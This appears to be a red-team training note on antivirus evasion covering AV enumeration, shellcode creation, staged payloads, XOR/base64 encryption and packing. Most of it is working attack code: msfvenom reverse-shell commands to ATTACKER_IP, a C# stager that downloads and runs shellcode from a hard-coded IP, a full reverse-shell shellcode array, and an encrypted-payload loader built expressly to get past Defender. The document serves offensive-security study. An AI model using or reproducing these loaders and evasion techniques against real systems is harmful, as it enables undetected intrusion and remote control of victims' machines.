---
title: "Antivirus Evasion"
date: 2026-06-25
weight: 11
---

## 1. Introduction
- Antivirus (AV) software is an extra layer of security that aims to detect and prevent the execution and spread of malicious files in a target operating system.
- What does AV software look for ? Malwares..
- Primary goal of Malware is to cause damage to machine, including but not limited to 
    - Gain full access to machine
    - Steal sensitive information such as passwords
    - Encrypt files and cause damage to files
    - Inject other malicious software or unwanted advertisements
    - Used the comprised machine to perfom further attacks such as botnet attacks


## 2.  Antivirus Features
### 1.1 AV Engines
- An AV Engine is resposible for finding and removing malicious code and files. Good AV software implements an effective and solid AV core that accurately and quickly analyzes malicious files. Also, it should handle and support vaious file types including archive files, where it can self extract and inspect all comprised files.
- Most AV Products share same common features but are implemented differently..
    - Scanner
    - Detection techniques (Signature-based,, Hearistic detection or Dynamic detection)
    - Compressors and Archives (ZIP, TGZ, 7z, XAR, RAR etc)
    - Unpackers (UPX, Armadillo, ASPack etc)
    - Emulators (VMProtect, Themida etc)


### 1.2 AV Static Detection
- Generally speaking, AV Detection has classified into three main approaches
    - Static Detection
    - Dynamic Detection
    - Heauristic and Behavioral Detection

- A static detection technique is the simplest type of Antivirus detection, which is based on predefined signatures of malicious files. Simply, it uses pattern-matching techniques in the detection, such as finding a unique string, CRC (Checksums), sequence of bytecode/Hex values, and Cryptographic hashes (MD5, SHA1, etc.).

- A Dynamic detection technique is a more advanced type of Antivirus detection, which is based on monitoring the behavior of a program in real-time. It uses techniques such as sandboxing, emulation, and behavioral analysis to detect malicious activity.

- A Heuristic and Behavioral detection technique is a more advanced type of Antivirus detection, which is based on analyzing the behavior of a program in real-time. It uses techniques such as sandboxing, emulation, and behavioral analysis to detect malicious activity.

- The following table contains well-known and commonly used AV software. 

    | Antivirus Name | Service Name | Process Name |
    | --- | --- | --- |
    | Microsoft Defender | WinDefend | MSMpEng.exe |
    | Trend Micro | TMBMSRV | TMBMSRV.exe |
    | Avira | AntivirService, Avira.ServiceHost | avguard.exe, Avira.ServiceHost.exe |
    | Bitdefender | VSSERV | bdagent.exe, vsserv.exe |
    | Kaspersky | AVP<Version #> | avp.exe, ksde.exe |
    | AVG | AVG Antivirus | AVGSvc.exe |
    | Norton | Norton Security | NortonSecurity.exe |
    | McAfee | McAPExe, Mfemms | MCAPExe.exe, mfemms.exe |
    | Panda | PavPrSvr | PavPrSvr.exe |
    | Avast | Avast Antivirus | afwServ.exe, AvastSvc.exe |

- A simple program to detect AV Software on a system:
    ```cs
    // csc.exe AntivirusCheck.cs
    // .\AntivirusCheck.exe

    // to check manually, 
    // CimInstance Win32_Process | Where-Object {$_.Name -match "MsMpEng|AdAwareService|afwServ|avguard|AVGSvc|bdagent|BullGuardCore|ekrn|fshoster32|GDScan|avp|K7CrvSvc|McAPExe|NortonSecurity|PavFnSvr|SavService|EnterpriseService|WRSA|ZAPrivacyService"}

    using System;
    using System.Management;

    internal class Program
    {
        static void Main(string[] args)
        {
            var status = false;
            Console.WriteLine("[+] Antivirus check is running .. ");
            string[] AV_Check = { 
                "MsMpEng.exe", "AdAwareService.exe", "afwServ.exe", "avguard.exe", "AVGSvc.exe", 
                "bdagent.exe", "BullGuardCore.exe", "ekrn.exe", "fshoster32.exe", "GDScan.exe", 
                "avp.exe", "K7CrvSvc.exe", "McAPExe.exe", "NortonSecurity.exe", "PavFnSvr.exe", 
                "SavService.exe", "EnterpriseService.exe", "WRSA.exe", "ZAPrivacyService.exe" 
            };
            var searcher = new ManagementObjectSearcher("select * from win32_process");
            var processList = searcher.Get();
            int i = 0;
            foreach (var process in processList)
            {
                int _index = Array.IndexOf(AV_Check, process["Name"].ToString());
                if (_index > -1)
                {
                    Console.WriteLine("--AV Found: {0}", process["Name"].ToString());
                    status = true;
                }
                i++;
            }
            if (!status) { Console.WriteLine("--AV software is not found!");  }
        }
    }
    ```


## 3. Introduction to Shellcode
- Shellcode is a set of crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to a system shell or create a reverse command shell
- To generate our own shellcode, we need to write and extract bytes from the assembler machine code. For this task, we will be using the Kali Linux terminal to create a simple shellcode for Linux that writes the string "THM, Rocks!". The following assembly code uses two main functions:
    - `sys_write` - writes data to a file descriptor
    - `sys_exit` - terminates the process

- For 64-bit linux, you can call the needed functions from the kernal by setting up the following values:

    | rax |   System call   |   rdi             |   rsi             |   rdx             |
    |-----|-----------------|-------------------|-------------------|-------------------|
    | 0x1 | sys_write       | unsigned int fd   | const char *buf   | size_t count      |
    | 0x3c | sys_exit       | int error_code    |                   |                   |

- For 64-bit linux, the rax register is used to indicate the fuction in the kernel we wish to call. Lets say.. Setting rax to 0x1 makes the kernel execute sys_write. and each of functions require some parameters to work, which can be set through rdi, rsi, and rdx registers.
- For sys_write, first parameter sent through rdi is the file descriptor to write to. 2nd parameter is rsi is a pointer to the string we want to print,a nd the third in rdx is size of string to point.
- For sys_exit, rdi needs to be set to the exit code of the program. We can use 0, which mean program exited successfully.

    ```asm
    global _start

    section .text
    _start:
        jmp MESSAGE 

    GOBACK:
        mov rax, 0x1       ; sys_write
        mov rdi, 0x1       ; stdout
        pop rsi            ; popping the string address from the stack, and storing it in rsi
        mov rdx, 0xd       ; string length
        syscall

        mov rax, 0x3c      ; sys_exit
        mov rdi, 0x0       ; exit code
        syscall

    MESSAGE:
        call GOBACK         ; Jump to the GOBACK label, and push address of next instruction (the string) to the stack
        db "THM, Rocks!", 0dh, 0ah
    ```
- Now we have the assembly code, which we can assemble and link.
    ```bash
    # Assemble and link the shellcode
    nasm -f elf64 shellcode.asm -o shellcode.o
    ld shellcode.o -o shellcode
    ./shellcode

    # Lets extract the assembly code with objdump, dumping the .text section of the compiled binary
    objdump -d shellcode
    objcopy -j .text -O binary shellcode shellcode.text

    # shellcode.text contains the raw machine code in binary format, so to be able to use it,
    # we will need to convert it to the hex first.
    xxd -i shellcode.text
    ```
- Now we have the hex representation of the shellcode, which we can use in our C program.
    ```c
    // shellc.c
    #include <stdio.h>
    int main(int argc, char **argv) {
        // TODO: Replace "xxxxxx" with the hex representation of the shellcode
        unsigned char shellcode[] = "xxxxxx";
        ((void(*)())shellcode)();
        return 0;
    }
    ```
- Now we have the C program with the shellcode, which we can compile and run.
    ```bash
    # compile the c program by disabling the NX protection,
    # which may prevent us from executing the code correctly in the data segment or stack.
    gcc -g -Wall -z execstack -o shellc shellc.c
    ./shellc
    ```



## 4. Generate shell code using plublic tools
- Most public C2 frameworks provide their own shellcode generator compatible with the c2 program. 
- But the drawback is that most, or we can say all, generated shellcodes are well-known to AV Vendors and can be easily detected.

- We will use msfvenom on kali linux, to generate shellcode that executes winodws files.
    ```bash
    # Generate shellcode that executes calc.exe
    msfvenom -a x86 --platform -p windows/exec cmd=calc.exe -f c -o shellcode2.c
    # As a result, the Metasploit framework generates a shellcode that executes the Windows calculator.
    ```
- Hackers inject shellcode into a running new thread and process using various techniques. shellcode injection techniques modify the program's execution flow to update registers and functions of the program to execute the attacker's own code.

- Now let's continue using teh generated shellcode and execute in on the operating system. 
- This follwoing is c code, containing our generated shellcode which will be injected in to memroy and wil execute "calc.exe".
    ```c
    #include <windows.h>
    // paste the shellcode generated by msfvenom here
    char stager[] = {
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30..."
    "...\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
    int main()
    {
            DWORD oldProtect;
            VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
            int (*shellcode)() = (int(*)())(void*)stager;
            shellcode();
    }
    ```
- Now let's compile it as an exe file
    ```bash
    # comple program for windows
    i686-w64-mingw32-gcc calc.c -o calc-MSF.exe

    # upload the exe file to the target
    smbclient -U username%password '//TARGET_IP/Tools' -c "put calc-MSF.exe"

    # execute the exe file on the target
    .\calc-MSF.exe
    # calc.exe should open
    ```

### 4.1 Generate shellcode from EXE files
- Shellcode can be stored in .bin files, which is raw data format. In this case, we can get shellcode of it using the `xxd -i`.
- Lets create a raw binary file using msfvenom to get the shellcode
```bash
msfvenom -a x86 --platform windows -p window/exec cmd=calc.exe -f raw > /tmp/example.bin
file /tmp/example.bin
xxd -i /tmp/example.bin
```


## 5. STaged Payloads

- **Stageless payload**
    - Stageless payloads are executed directly without any staging process.
    - They are larger and more likely to be detected by AV.
    - No network communication is required.
- **Staged payload**
    - Staged payloads are used to bypass AV detection by splitting the payload into two parts: a small initial payload (stager) and a larger final payload (stage).
    - The stager is smaller and less likely to be detected by AV, while the stage is downloaded separately and executed.
    - Network communication is required to download the stage.
    - Small disk footprint.
    - Can be used to bypass AV detection.
    - Reuse same stage0 dropper for multiple stages. stage0 is the initial payload that downloads the multiple stages.

- **Stagers in Metasploit**
    - when creating payloads with msfvenom, we can choose to use either staged or stageless payloads.

    |  payload                              | Type              |
    |---------------------------------------|-------------------|
    | windows/x64/meterpreter/reverse_tcp   | staged payload    |
    | windows/x64/meterpreter_reverse_tcp   | stageless payload |
    
### 5.1 Creating Own Stager.
- Create shellcode (stage) in the attacker machine.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'

# let stager download this shellcode.bin from attacker machine. So starting https server.
# generate a self-singed cert...
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
sudo python3 -c "
import http.server, ssl;
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);
context.load_cert_chain(certfile='localhost.pem');
server_address=('0.0.0.0',443);

httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler);
httpd.socket = context.wrap_socket(httpd.socket,server_side=True);
httpd.serve_forever();
"

# Now listen for victim's reverse shell on 7474
nc -lvnp 7474
```


- Create a stager in the windows victim machine.
```cs
// msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
// listen on 7474
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
	[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

	[DllImport("kernel32")]
  	private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

	
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

	public static void Main()
	{
	string url = "https://192.168.149.231/shellcode.bin";
	Stager(url);
	}

	public static void Stager(string url)
	{
	WebClient wc = new WebClient();
	ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
	ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
	
	byte[] shellcode = wc.DownloadData(url);
	
	UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
	
	IntPtr threadHandle = IntPtr.Zero;
	UInt32 threadId = 0;
	IntPtr parameter = IntPtr.Zero;
	threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
	
	WaitForSingleObject(threadHandle, 0xFFFFFFFF);
   }
}
```
- compile and run the stager...
```powershell
csc.exe stager.cs
.\stager.exe
# executs the payload in new thread, and gives us reverse shell.
```


### 5.2 Encode and encrypt the shellcode
- Public tools such as Metasploit provide encoding and encryption features. 
- However AV vendors are aware of the way these tools build their payloads and take measures to detect them.

- Lets generate a simple payload with this method to prove that point.
```bash
# list available encoders 
msfvenom --list encoders | grep excellent
# list available encryptors
msfvenom --list encrypt
# Remember we are using staged payload here, notice the '/' here.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encoder x86/shikata_ga_nai -o encoded_revshell_payload.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyKey***" -o xored_revshell_payload.exe

# upload of both of these to the target system and test them. 
# they will be detected by AV software.
```

### 5.3 Creating custom paylaod.
- The best way to overcome this is to use our own custom encoding schemes so that AV doesnt know what to do to analyze our payload.
- for this task, we will take a simple reverse shell generated by msfvenom and use a combination of XOR and base64 to bypass defender.
```bash
# notic we are using stageless paylad
msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp -o payload.cs
cat payload.cs
# paste this payload into payload encryptor program for encryption...

# listen for the reverse shell...
sudo nc -lvp 443
```
- Before building our actual payload, we will create a program that will take the shellcode generated by msfvenom and encode and encrypt it in any way we like.
```cs
// payload encrypter for stager.

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
	internal class Program
	{
		private static byte[] xor(byte[] shell, byte[] KeyBytes)
		{
			for (int i = 0; i < shell.Length; i++)
			{
				shell[i] ^= KeyBytes[i % KeyBytes.Length];
			}
			return shell;
		}
		static void Main(string[] args)
		{
			string key = "THMK3y123!";
			byte[] KeyBytes = Encoding.ASCII.GetBytes(key);
			
            // paste here the payload from msfvenom.
			byte[] buf = new byte[460] 
			{
				0xfc,0x48,0x83,0xe4,0xf0,0xe8, 
				0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
				0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
				0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
				0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
				0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
				0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
				0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
				0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
				0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
				0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
				0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
				0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
				0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
				0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
				0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
				0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
				0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
				0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
				0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,
				0xc0,0xa8,0x95,0xe7,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
				0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
				0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
				0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
				0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
				0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
				0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
				0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
				0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
				0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
				0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
				0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
				0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
				0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
				0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
				0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,
				0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
				0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
				0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
			};
		
			byte[] encoded = xor(buf, KeyBytes);
			Console.WriteLine(Convert.ToBase64String(encoded));

		}
	}
}
```
- Let's compile and run the encrypter, to get the encrypted payload.
```powershell
csc.exe /out:payload_encrypter.exe payload_encrypter.cs
.\payload_encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
```

- Lets write the stager, which should be capable of decrypting the payload and executing it.
```cs
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
	[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

	[DllImport("kernel32")]
  	private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

	
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

	private static byte[] xor(byte[] shell, byte[] KeyBytes)
	{
		for (int i = 0; i < shell.Length; i++)
		{
			shell[i] ^= KeyBytes[i % KeyBytes.Length];
		}
		return shell;
	}

	public static void Main()
	{
        // paste the base64 encoded, and xor encrypted payload here.
        // output of payload_encrypter.exe
		string dataBS64= "qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEzw89Gk1XJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==";
		byte[] data = Convert.FromBase64String(dataBS64);
		string key = "THMK3y123!";
		byte[] KeyBytes = Encoding.ASCII.GetBytes(key);
		byte[] encoded = xor(data, KeyBytes);
		
	
		UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);
	
		IntPtr threadHandle = IntPtr.Zero;
		UInt32 threadId = 0;
		IntPtr parameter = IntPtr.Zero;
		threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
	
		WaitForSingleObject(threadHandle, 0xFFFFFFFF);
	}
}
```
- Compile and run the stager.
```powershell
csc.exe /out:encypted_stager.exe encrypted_stager.cs
.\encypted_stager.exe
```

## 6. Packers
- Another method to defeat disk-based AV detection is to use packer.
- Packers are pieces of software that take program as input and transform it so that its structure looks different, but their functionality remains same.
- Packers do this with two main goals in mind:
    - Compress the program so that it takes up less space.
    - Protect the program from reverse engineering in general
- Packers are commonly used by software developers who would like to protect their software from bein reverse engineered or cracked.
- they achieve some level of protection by implementing a mixture of transforms that include compressing, encrypting, adding debugging protections and many others. As you may already guessed, packers are also commonly used to obfuscate malware without much effort

### 6.1 Packing an application
![Packing an application](/resources_redteam/packers.png)

- When an application is packed, it will be transformed in some way using a packing function. 
- The packing function needs to be able to obfuscate and transform the original code of the application in a way that can be reasonably reversed by an unpacking function so that the original functionality of the application is preserved. 
- While sometimes the packer may add some code (to make debugging the application harder, for example), it will generally want to be able to get back the original code you wrote when executing it.
- The packed version of the application will contain your packed application code. Since this new packed code is obfuscated, the application needs to be able to unpack the original code from it. To this end, the packer will embed a code stub that contains an unpacker and redirect the main entry point of the executable to it.

### 6.2 Packing our shellcode..
```cs
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };


    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```
```powershell
csc.exe /out:packed_shellcode.exe packed_shellcode.cs

# ConfuserEX packer, use it and select the "Control Flow" and "Constants" options
# Once generated, execute it.
# Listen for reverse shell attacker  machine.
```


























